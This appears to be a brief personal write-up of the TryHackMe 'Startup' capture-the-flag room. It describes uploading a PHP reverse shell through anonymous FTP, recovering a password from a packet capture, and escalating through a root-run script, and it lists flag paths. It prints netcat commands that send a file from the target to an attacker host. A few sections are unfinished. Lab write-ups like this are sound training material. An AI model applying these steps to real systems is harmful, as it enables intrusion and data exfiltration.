# Startup 🧭
Names | Details
--------|-----
Source | tryhackme
Level     | Easy
Os | Linux

**Notes :**




## Gaining Access 😉

- ftp port is open 
	- run ls -la , we have write permission
	- it can be logined by any ramdom password 
	- ran '?'
	- uploaded a php reverseshell on ftp using put command



## Maintaining Access 🥷
- file found on root incident
	- pcadpng file available
	- downloaded using python simple http
	- found an password enter incident from another user
	- tried the password for lennie
- logged in as lennie (su lennie and ssh lennie@host: both are possible)
- found .sh script owned by root which executes another script owned by lennie
	- /etc/
## Important commands 🔥
- to share files from victim to attacker nc
	- Local: `nc -l -p 1234 > suspicious.pcapng`

	- Target: `nc -w 3 $LHOST 1234 < suspicious.pcapng`
- ettercap to read .pcapng files
	-   `ettercap -T -r suspicious.pcapng`
	-   pspy and linpease can be used for further enumeration

## Post Exploitation ✴️
- /recip.txt
- User flag : /home/lennie/user.txt
- Root flag : /root/root
## Tips 💡
- something


--------------------------------
**By Nibras Muhammed** 🤓🖥️






